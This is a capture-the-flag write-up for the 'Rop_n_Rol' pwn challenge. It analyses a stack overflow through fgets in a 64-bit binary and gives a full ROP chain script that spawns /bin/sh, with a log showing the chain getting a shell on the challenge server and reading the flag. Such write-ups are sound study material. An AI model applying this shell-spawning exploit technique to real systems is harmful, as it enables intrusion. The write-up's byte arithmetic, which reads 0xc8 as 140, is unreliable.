# Rop_n_Rol

>Pwn | 300 points
-----------

## Problem Statement
> Can you hold your rope and get to the moon??  
> nc 13.233.99.37 1008  
> [File](./chall)

## Analysis

* Let's check the binary first
```shell
$ checksec ./chall
[ * ] '/root/ctfs/CTF_Writeups/inctf_2019/rop_n_roll/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
> the above output shows that we can't execute any instructions from stack
* Now let's check if we can get the control of the return instruction

* GDB disassembly looks like
   >    ```gdb
   >     gdb$ disass main
   >     Dump of assembler code for function main:
   >        0x0000000000401cba <+0>:	push   rbp
   >        0x0000000000401cbb <+1>:	mov    rbp,rsp
   >        0x0000000000401cbe <+4>:	sub    rsp,0x20
   >        0x0000000000401cc2 <+8>:	mov    eax,0x0
   >        0x0000000000401cc7 <+13>:	call   0x401c6d <initialize>
   >        0x0000000000401ccc <+18>:	lea    rdi,[rip+0x8e335]        # 0x490008
   >        0x0000000000401cd3 <+25>:	call   0x4116a0 <puts>
   >        0x0000000000401cd8 <+30>:	lea    rdi,[rip+0x8e353]        # 0x490032
   >        0x0000000000401cdf <+37>:	call   0x4116a0 <puts>
   >        0x0000000000401ce4 <+42>:	mov    rdx,QWORD PTR [rip+0xb6abd]        # 0x4b87a8 <stdin>
   >        0x0000000000401ceb <+49>:	lea    rax,[rbp-0x20]
   >        0x0000000000401cef <+53>:	mov    esi,0xc8
   >        0x0000000000401cf4 <+58>:	mov    rdi,rax
   >        0x0000000000401cf7 <+61>:	call   0x411160 <fgets>
   >        0x0000000000401cfc <+66>:	lea    rdi,[rip+0x8e344]        # 0x490047
   >        0x0000000000401d03 <+73>:	call   0x4116a0 <puts>
   >        0x0000000000401d08 <+78>:	mov    eax,0x0
   >        0x0000000000401d0d <+83>:	leave  
   >        0x0000000000401d0e <+84>:	ret    
   >     End of assembler dump.
   >    ```
   

* In the above challenge  the entire stack frame is 32 bytes ie 0x20

    >```gdb
    >   0x0000000000401ceb <+49>:	lea    rax,[rbp-0x20]
    >   0x0000000000401cef <+53>:	mov    esi,0xc8
    >   0x0000000000401cf4 <+58>:	mov    rdi,rax
    >   0x0000000000401cf7 <+61>:	call   0x411160 <fgets>
    >``` 
    > fgets starts to write data from **[rbp-0x20]** but maximum no of characters
    > that fgets can write is **0x8c** ie 140 characters
    > And thats where we can exploit the program

## Solution
* Lets look at the stack
```
Stack map
[rbp-0x20]    [ -- -- -- -- ]
[rbp-0x1c]    [ -- -- -- -- ]
[rbp-0x18]    [ -- -- -- -- ]
[rbp-0x14]    [ -- -- -- -- ]
[rbp-0x10]    [ -- -- -- -- ]
[rbp-0xc]     [ -- -- -- -- ]
[rbp-0x8]     [ -- -- -- -- ]
[rbp-0x4]     [ -- -- -- -- ]
[   bp   ]    [ -- -- -- -- ]
[        ]    [ -- -- -- -- ]
[   ret  ]    [ -- -- -- -- ]
[        ]    [ -- -- -- -- ]
```
* Remember we can only write 140 bytes out of which 32 bytes will be consumed by
the buffer and the base pointer will take up 8 bytes

* And then we will be able to overwrite the return pointer
    >   140 - 32 -8 = 100 bytes
    > we only have 100 bytes for all instructions we want to write 

## Exploit 
* Now its time to write our ROP chain within the givin limits
* [**get_flag.py**](./get_flag.py)

   >    ```python
   >     #!/usr/bin/python2
   >     from struct import pack
   >     p = 'A' * 0x20 + 'B' * 8
   >     p += pack('<Q', 0x0000000000406f80)  # pop rsi ; ret
   >     p += pack('<Q', 0x00000000004b80e0)  # @ .data
   >     p += pack('<Q', 0x00000000004489ec)  # pop rax ; ret
   >     p += '/bin//sh'
   >     p += pack('<Q', 0x0000000000477f51)  # mov qword ptr [rsi], rax ; ret
   >     p += pack('<Q', 0x0000000000406f80)  # pop rsi ; ret
   >     p += pack('<Q', 0x00000000004b80e8)  # @ .data + 8
   >     p += pack('<Q', 0x0000000000443260)  # xor rax, rax ; ret
   >     p += pack('<Q', 0x0000000000477f51)  # mov qword ptr [rsi], rax ; ret
   >     p += pack('<Q', 0x0000000000401796)  # pop rdi ; ret
   >     p += pack('<Q', 0x00000000004b80e0)  # @ .data
   >     p += pack('<Q', 0x0000000000406f80)  # pop rsi ; ret
   >     p += pack('<Q', 0x00000000004b80e8)  # @ .data + 8
   >     p += pack('<Q', 0x0000000000447fb5)  # pop rdx ; ret
   >     p += pack('<Q', 0x00000000004b80e8)  # @ .data + 8
   >     p += pack('<Q', 0x0000000000443260)  # xor rax, rax ; ret
   >     p += pack('<Q', 0x000000000041813f)  # add al, 0x3a ; ret
   >     p += pack('<Q', 0x000000000046d520)  # add rax, 1 ; ret
   >     p += pack('<Q', 0x0000000000481605)  # syscall ; ret
   >     print(p)
   >     ```

* On local system
```shell
    $ (python get_flag.py;cat) |./chal
```
* On shell server
```shell
    $ (python get_flag.py;cat) | nc 13.233.99.37 1008
    Catch your rope to get to your desination
    Give your rope here!
    See ya on moon!
    ls
    chall
    flag
    run.sh
    cat flag
    inctf{Y0ur_R0p3_c4n_b3_533n_fr0m_7h3_M00n}
    exit
```
